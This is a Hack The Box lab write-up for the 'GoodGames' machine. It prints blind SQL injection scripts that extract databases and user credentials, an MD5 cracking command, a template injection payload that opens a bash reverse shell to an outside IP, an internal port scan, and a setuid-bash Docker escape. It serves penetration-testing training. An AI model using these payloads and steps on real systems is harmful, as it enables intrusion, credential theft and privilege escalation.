---
layout: single
title: GoodGames - Hack The Box
excerpt: "GoodGames is an Easy linux machine that showcases the importance of sanitising user inputs in web applications to prevent SQL injection attacks, using strong hashing algorithms in database structures to prevent the extraction and cracking of passwords from a compromised database, along with the dangers of password re-use. It also highlights the dangers of using `render_template_string` in a Python web application where user input is reflected, allowing Server Side Template Injection (SSTI) attacks. Privilege escalation involves docker hosts enumeration and shows how having admin privileges in a container and a low privilege user on the host machine can be dangerous, allowing attackers to escalate privileges to compromise the system."
date: 2025-05-14
classes: wide
header:
  teaser: /img2/goodgames.PNG
  teaser_home_page: true
  icon: /img2/images/hackthebox.webp
categories:
  - hackthebox
  - Linux
  - Easy
tags:
  - SQLI (Error Based)
  - Hash Cracking Weak Algorithms
  - Password Reuse
  - Server Side Template Injection (SSTI)
  - Docker Breakout (Privilege Escalation) [PIVOTING]
---


## Reconnaissance

- Whatweb

```bash
whatweb http://10.10.11.130/
```

![](/img2/Pasted%20image%2020250514110946.png)

## Exploitation

- SQLI Error Based

![](/img2/Pasted%20image%2020250514115239.png)

![](/img2/Pasted%20image%2020250514115352.png)

- Get all databases

```python
#!/usr/bin/env python3

import requests
import signal
import sys
import string
import time
from pwn import *


def def_handler(sig,frame):
	print("\n\n[!] Exiting...\n")
	sys.exit(1)


signal.signal(signal.SIGINT,def_handler)


url = "http://10.10.11.130/login"
characters = string.ascii_lowercase + "_,-" + string.digits



def SQLI():
	p1=log.progress("Brute Force")
	p1.status("Starting Attack")

	time.sleep(2)

	p2=log.progress("Data")
	info=""


	for position in range(1,1000):
		for character in characters:
			data = {
  			'email' : "test'or SUBSTRING((SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata), "+str(position)+", 1) = '"+character+"'-- -",
  			'password' : 'test'}
			r=requests.post(url,data=data)
			if "Login Success" in r.text:
				info+=character
				p2.status(info)
				break

SQLI()
```

```bash
python3 exploit.py
```

![](/img2/Pasted%20image%2020250514123729.png)

- Get actual database tables

```python
#!/usr/bin/env python3

import requests
import signal
import sys
import string
import time
from pwn import *


def def_handler(sig,frame):
	print("\n\n[!] Exiting...\n")
	sys.exit(1)


signal.signal(signal.SIGINT,def_handler)


url = "http://10.10.11.130/login"
characters = string.ascii_lowercase + "_,-" + string.digits



def SQLI():
	p1=log.progress("Brute Force")
	p1.status("Starting Attack")

	time.sleep(2)

	p2=log.progress("Data")
	info=""


	for position in range(1,1000):
		for character in characters:
			data = {
  			'email' : "test'or SUBSTRING((SELECT GROUP_CONCAT(table_name) FROM information_schema.tables where table_schema=database()), "+str(position)+", 1) = '"+character+"'-- -",
  			'password' : 'test'}
			r=requests.post(url,data=data)
			if "Login Success" in r.text:
				info+=character
				p2.status(info)
				break

SQLI()
```

```bash
python3 exploit.py
```

![](/img2/Pasted%20image%2020250514123856.png)

- Get User columns

```python
#!/usr/bin/env python3

import requests
import signal
import sys
import string
import time
from pwn import *


def def_handler(sig,frame):
	print("\n\n[!] Exiting...\n")
	sys.exit(1)


signal.signal(signal.SIGINT,def_handler)


url = "http://10.10.11.130/login"
characters = string.ascii_lowercase + "_,-" + string.digits



def SQLI():
	p1=log.progress("Brute Force")
	p1.status("Starting Attack")

	time.sleep(2)

	p2=log.progress("Data")
	info=""


	for position in range(1,1000):
		for character in characters:
			data = {
  			'email' : "test'or SUBSTRING((SELECT group_concat(column_name) from information_schema.columns where table_name='user'), "+str(position)+", 1) = '"+character+"'-- -",
  			'password' : 'test'}
			r=requests.post(url,data=data)
			if "Login Success" in r.text:
				info+=character
				p2.status(info)
				break

SQLI()
```

```bash
python3 exploit.py
```

![](/img2/Pasted%20image%2020250514124639.png)

- Get email,password and name in Users

```python
#!/usr/bin/env python3

import requests
import signal
import sys
import string
import time
from pwn import *


def def_handler(sig,frame):
	print("\n\n[!] Exiting...\n")
	sys.exit(1)


signal.signal(signal.SIGINT,def_handler)


url = "http://10.10.11.130/login"
characters = string.ascii_lowercase + "_,-" + string.digits



def SQLI():
	p1=log.progress("Brute Force")
	p1.status("Starting Attack")

	time.sleep(2)

	p2=log.progress("Data")
	info=""


	for position in range(1,1000):
		for character in characters:
			data = {
  			'email' : "test'or SUBSTRING((SELECT group_concat(name,',',email,',',password,',') from user), "+str(position)+", 1) = '"+character+"'-- -",
  			'password' : 'test'}
			r=requests.post(url,data=data)
			if "Login Success" in r.text:
				info+=character
				p2.status(info)
				break

SQLI()
```

```bash
python3 exploit.py
```

![](/img2/Pasted%20image%2020250514132208.png)

- Crack hash

```bash
echo "2b22337f218b2d82dfc3b6f77e7cb8ec" > hash.txt
```

```bash
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

![](/img2/Pasted%20image%2020250514132506.png)


![](/img2/Pasted%20image%2020250514132729.png)

- SSTI

![](/img2/Pasted%20image%2020250514133438.png)

![](/img2/Pasted%20image%2020250514133710.png)

```
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('whoami').read() }}
```

- Reverse shell

![](/img2/Pasted%20image%2020250514133953.png)

```
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('bash -c "bash -i >& /dev/tcp/10.10.16.2/9000 0>&1"').read() }}
```

```bash
nc -nlvp 9000
```

## Post-exploitation

- Check all interfaces

```bash
ip a
```

![](/img2/Pasted%20image%2020250514151344.png)

- Check internal ports

```bash
for i in {1..1024}; do (echo >/dev/tcp/172.19.0.1/$i) &>/dev/null && echo "[+] Port $i open"; done
```

![](/img2/Pasted%20image%2020250514151508.png)

- Check mounts

```bash
mount | grep augustus
```

![](/img2/Pasted%20image%2020250514151625.png)

```bash
ssh augustus@172.19.0.1
```

```bash
cp /bin/bash .
exit
```

```bash
chown root:root /bin/bash
chmod u+s /bin/bash
```

```bash
ssh augustus@172.19.0.1
```

```bash
./bash -p
```

![](/img2/Pasted%20image%2020250514141200.png)